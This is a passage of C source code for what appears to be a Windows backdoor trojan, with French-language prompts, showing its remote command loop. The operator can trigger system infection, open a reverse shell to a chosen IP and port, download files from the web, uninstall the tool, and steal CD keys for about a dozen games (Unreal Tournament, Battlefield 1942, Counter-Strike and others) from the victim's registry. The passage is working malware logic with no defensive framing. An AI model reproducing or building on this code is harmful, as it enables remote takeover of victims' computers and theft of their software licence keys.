				if(strcmp(tempBuff, "y") == 0)
 					webdownload(ih,url,dest,1);
				else
 					webdownload(ih,url,dest,0);
				viderEtInvite(buffer);
		}

		else if(strcmp(buffer,"infect") == 0){
			infectSystem(filename1);
			strcpy(buffer,"\r\nAll System Infection Done!\r\n");
			send(s2,buffer,strlen(buffer),0);

			viderEtInvite(buffer);
		}

		else if(strcmp(buffer,"reverse") == 0){
			sprintf(tempBuff,"\r\nEnvoyer le shell vers quelle ip?\r\n");
			send(s2,tempBuff,strlen(tempBuff),0);

 			memset(tempBuff,0,sizeof(tempBuff));

			strcpy(ip,recevoir());

			sprintf(tempBuff,"\r\nEnvoyer le shell vers port?\r\n");
			send(s2,tempBuff,strlen(tempBuff),0);

 			memset(tempBuff,0,sizeof(tempBuff));

 			strcpy(port,recevoir());

			reversePort = atoi(port);

 			reverse(ip,reversePort);
			viderEtInvite(buffer);
		}

		else if(strcmp(buffer,"cdki") == 0){
			menuCdKeys(buffer);
			viderEtInvite(buffer);
		}
		else if(strcmp(buffer,"cdki -ut2k3") == 0){    //UT2003 KEY
			chercherKeyJeu(1,buffer,"Software\\Unreal Technology\\Installed Apps\\UT2003", "CDKey", "\r\nFound Unreal Tournament 2003 CDKey (%s).\r\n", "\r\nUnreal Tournament 2003 not Found!\r\n");
		}
		else if(strcmp(buffer,"cdki -ut2k4") == 0){    //UT2004 KEY
			chercherKeyJeu(1,buffer,"Software\\Unreal Technology\\Installed Apps\\UT2004", "CDKey", "\r\nFound Unreal Tournament 2004 CDKey (%s).\r\n", "\r\nUnreal Tournament 2004 not Found!\r\n");
		}
		else if(strcmp(buffer,"cdki -chaser") == 0){    //Chaser
			chercherKeyJeu(1,buffer,"Software\\Cauldron\\Chaser", "CDKey", "\r\nFound Chaser CDKey (%s).\r\n", "\r\nChaser not Found!\r\n");
		}
		else if(strcmp(buffer,"cdki -sacred") == 0){    //Sacred
			chercherKeyJeu(2,buffer,"Software\\Ascaron Entertainment\\Sacred", "InstallKey", "\r\nFound Sacred CDKey (%s).\r\n", "\r\nSacred not Found!\r\n");
		}
		else if(strcmp(buffer,"cdki -cs") == 0){    //Counter Strike
			chercherKeyJeu(2,buffer,"Software\\Valve\\CounterStrike\\Settings", "CDKey", "Found Counter-Strike ( Retail ) CDKey (%s).\r\n", "\r\nCounter Strike not Found!\r\n");
		}
		else if(strcmp(buffer,"cdki -igi2") == 0){    //Project IGI 2
			chercherKeyJeu(1,buffer,"Software\\IGI 2 Retail", "CDKey", "Found Project IGI 2 CDKey (%s).\r\n", "\r\nProject IGI 2 not Found!\r\n");
		}
		else if(strcmp(buffer,"cdki -1942") == 0){    //Battlefield 1942
			chercherKeyJeu(1,buffer,"Software\\Electronic Arts\\EA GAMES\\Battlefield 1942", "ergc", "Found Battlefield 1942 CDKey (%s).\r\n", "\r\nBattleField 1942 not Found!\r\n");
		}
		else if(strcmp(buffer,"cdki -1942rtr") == 0){    //Battlefield 1942 Road To Rome
			chercherKeyJeu(1,buffer,"Software\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome", "ergc", "Found Battlefield 1942 Road To Rome CDKey (%s).\r\n", "\r\nBattleField 1942 Road To Rome not Found!\r\n");
		}
		else if(strcmp(buffer,"cdki -raven") == 0){    //RavenShield
			chercherKeyJeu(1,buffer,"SOFTWARE\\Red Storm Entertainment\\RAVENSHIELD", "CDKey", "Found Rainbow Six III RavenShield CDKey (%s).\r\n", "\r\nRainbow Six III RavenShield not Found!\r\n");
		}
		else if(strcmp(buffer,"cdki -ccgen") == 0){    //Command and Conquer Generals
			chercherKeyJeu(1,buffer,"Software\\Electronic Arts\\EA GAMES\\Generals\\ergc", "CDKey", "Found Command & Conquer Generals CDKey (%s).\r\n", "\r\nCommand & Conquer Generals not Found!\r\n");
		}
		else if(strcmp(buffer,"cdki -glad") == 0){    //The Gladiators
			chercherKeyJeu(2,buffer,"Software\\Eugen Systems\\The Gladiators", "RegNumber", "Found The Gladiators CDKey (%s).\r\n", "\r\nThe Gladiators not Found!\r\n");
		}
		else if(strcmp(buffer,"uninstall") == 0){
			uninstall();
		}

		else if((strcmp(buffer,"quit") == 0) || (strcmp(buffer,"exit") == 0)){
			memset(buffer,0,sizeof(buffer));
			strcpy(buffer,"\r\nC ya CowBoyz!\n");
			send(s2,buffer,strlen(buffer),0);
			shutdown(s1,2);
			closesocket(s1);
			shutdown(s2,2);
			closesocket(s2);
			WSACleanup();
        	connectAndInitialize();    //initialisation du serveur
			menuPrincipal(buffer);

			strcpy(buffer,Invite);
			send(s2,buffer,strlen(buffer),0);
		}
		else{
			strcpy(buffer,"\r\ncommande inconnue, pour plus d'information, tapez 'help'\r\n");
			send(s2,buffer,strlen(buffer),0);

			viderEtInvite(buffer);
		}
	}
}


